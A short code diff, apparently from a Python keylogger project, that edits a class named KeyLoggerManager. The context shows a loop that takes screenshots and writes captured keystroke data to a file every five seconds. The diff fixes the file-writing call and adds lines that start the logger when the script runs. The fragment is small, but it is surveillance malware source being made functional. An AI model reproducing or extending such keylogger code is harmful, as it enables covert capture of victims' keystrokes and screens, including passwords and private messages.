@@ -13,7 +13,7 @@ class KeyLoggerManager:
         self.instance.start()
 
     def write_to_file(self):
-        FileWriter.write_to_file(self.instance.get_data())
+        FileWriter().write(self.instance.get_data())
 
     def main(self):
         threading.Thread(target=self.start).start()
@@ -23,3 +23,6 @@ class KeyLoggerManager:
             self.instance.current_screenshot()
             threading.Thread(target=self.write_to_file).start()
             time.sleep(5)
+
+A = KeyLoggerManager()
+A.main()
